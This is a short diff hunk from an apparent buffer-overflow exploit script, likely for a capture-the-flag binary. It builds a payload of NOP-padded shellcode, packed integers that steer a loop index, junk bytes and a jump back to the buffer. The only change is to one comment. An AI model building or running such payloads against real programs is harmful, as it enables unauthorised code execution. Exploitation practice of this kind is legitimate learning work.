@@ -20,7 +20,7 @@ payload = shellcode.ljust(64,'\x90') # total 64
 payload += "\x00" * 8
 payload += struct.pack('<I',0x000000ff) # read_byte1
 payload += struct.pack('<I',0x00000000) # read_byte2
-payload += struct.pack('<I',0x55555555) # force idx to break
+payload += struct.pack('<I',0x55555555) # make idx continue the loop 
 
 payload += "A" * 12 # Junk
 #jump back to the given buf addr
